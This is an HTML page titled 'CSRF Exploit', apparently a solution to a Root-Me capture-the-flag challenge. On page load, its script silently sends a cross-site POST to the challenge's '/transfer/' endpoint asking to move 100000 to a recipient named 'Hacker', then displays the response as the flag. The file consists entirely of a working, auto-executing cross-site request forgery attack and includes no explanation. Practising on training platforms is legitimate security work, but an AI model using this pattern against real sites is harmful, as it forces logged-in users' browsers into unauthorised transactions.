<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit</title>
</head>
<body>
    <script>
        function post(url, params={}){
            var params_post = [];
            for(const key in params){
                params_post.push(`${key}=${encodeURIComponent(params[key])}`);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById("flag").setAttribute("value", xhr.responseText);
                }
            };
            xhr.send(params_post.join("&"));
        }

        function view_flag(){
            let res = post("https://bankme-1.challenges.pro.root-me.org/transfer/", {recipient: "Hacker", amount: "100000"});
        }

        view_flag();
    </script>
    <input type="text" id="flag" value="">
</body>
</html>
